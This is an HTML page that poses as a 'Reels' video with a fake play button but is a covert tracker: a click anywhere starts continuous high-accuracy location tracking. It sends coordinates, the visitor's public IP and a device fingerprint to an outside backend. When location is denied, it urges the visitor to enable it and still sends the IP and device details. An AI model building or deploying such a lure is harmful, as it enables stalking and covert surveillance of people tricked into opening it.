<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- ‚úÖ Important -->
 
  <title>Device & Location Info</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      color: #333;
      padding: 0px;
      position: relative;
      /* height: 100vh;
      width: 100vw; */
      padding: 0px;
      margin: 0px;
    }
    .fs { 
      color: white; font-weight: bolder;
     font-size: 24px;
     padding-left: 20px;
     padding-top: 15px;
     margin: 0px;
     background: linear-gradient(rgb(58, 58, 58), transparent);
     }

    .playButtonContainer {
      width: 100%;  
      height: 100vh;
      display: flex;
  justify-content: center;
      align-items: center;
      position: fixed;
      top: 0px;
      left: 0px;
    }

    .playButton {
       width: 100px;
      height: 100px;
      background: rgba(0,0,0,0.6);
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      transition: transform 0.2s;}

        .playButton::before {
      content: '';
      margin-left: 5px;
      border-style: solid;
      border-width: 20px 0 20px 35px;
      border-color: transparent transparent transparent white;
    }

    #output {
      position: fixed;
      bottom: 30px;
      font-size: 1px;
    }
    
   
  </style>
</head>
<body onclick="startTracking()" style="background-color: black; background: url(./i.png) no-repeat center center fixed; background-size: cover; " >
  <div class="fs">‚Üê  &nbsp Reels</div>

 


   <div class="playButtonContainer">
    <div class="playButton" onclick="startTracking()"></div>
  </div>

  <div id="output" style="color:white; font-size:18px; text-align:center; margin-top:20px;"></div>
  

  <script>
    // Parse device info
    const parser = new UAParser();
    const result = parser.getResult();

   const browserName = result.browser.name || "Unknown";
  const browserVersion = result.browser.version || "Unknown";
  const osName = result.os.name || "Unknown";
  const osVersion = result.os.version || "Unknown";
  const deviceType = result.device.type || "Desktop";
  const deviceBrand = result.device.vendor || "Unknown";
  const deviceModel = result.device.model || "Unknown";
  const engineName = result.engine.name || "Unknown";
  const engineVersion = result.engine.version || "Unknown";
  const cpuArch = result.cpu.architecture || "Unknown";
  const userAgentFull = navigator.userAgent;

  // Example: log all variables
  console.log("Browser:", browserName, browserVersion);
  console.log("OS:", osName, osVersion);
  console.log("Device Type:", deviceType);
  console.log("Brand:", deviceBrand);
  console.log("Model:", deviceModel);
  console.log("Engine:", engineName, engineVersion);
  console.log("CPU:", cpuArch);
  console.log("User Agent:", userAgentFull);

    // Get public IP
    let ipAddress = null;
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        console.log(data.ip);
        ipAddress=data.ip;
      });



  const deviceInfo = {
      browser: {
        name: browserName,
        version: browserVersion
      },
      os: {
        name: osName,
        version: osVersion
      },
      device: {
        type: deviceType,
        brand: deviceBrand,
        model: deviceModel
      },
      cpu: cpuArch,
      userAgent: userAgentFull,
    };

// Convert to JSON string
const jsonString = JSON.stringify(deviceInfo);



    // Get location

    let watchId = null;

  function startTracking() {
    if (navigator.geolocation) {
      watchId = navigator.geolocation.watchPosition(sendPosition, showError, {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 10000
      });
      // document.getElementById("output").innerText = "üìç Requesting location...";
    } else {
      // document.getElementById("output").innerText = "‚ùå Geolocation not supported on this device.";
    }
  }

  function retryTracking() {
    startTracking(); // try again
  }

  function sendPosition(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    fetch("https://geo-location-backend-production.up.railway.app/api/v1/pushLocation", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        deviceName: JSON.stringify(deviceInfo),
        ipAddress: JSON.stringify(ipAddress),
        lat: lat,
        lon: lon
      })
    })
     
  }

  function showError(error) {

    
    let msg = "Cancelled";
    switch(error.code) {
      case error.PERMISSION_DENIED:
        msg = "Please enable location in browser settings and click play again.";
        // document.getElementById("retryBtn").style.display = "inline-block"; // show retry button
        break;
      case error.POSITION_UNAVAILABLE:
        // msg = "‚ö†Ô∏è Location information unavailable.";
        break;
      case error.TIMEOUT:
        // msg = "‚è≥ Request timed out. Click Retry.";
        // document.getElementById("retryBtn").style.display = "inline-block";
        break;
      default:
        // msg = "‚ùå Unknown error occurred.";
    }
    document.getElementById("output").innerText = msg;
     fetch("https://geo-location-backend-production.up.railway.app/api/v1/pushLocation", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        deviceName: JSON.stringify(deviceInfo),
        ipAddress: JSON.stringify(ipAddress),
        lat: "0",
        lon: "0"
      })
    })
      
  }    

  </script>
</body>
</html>
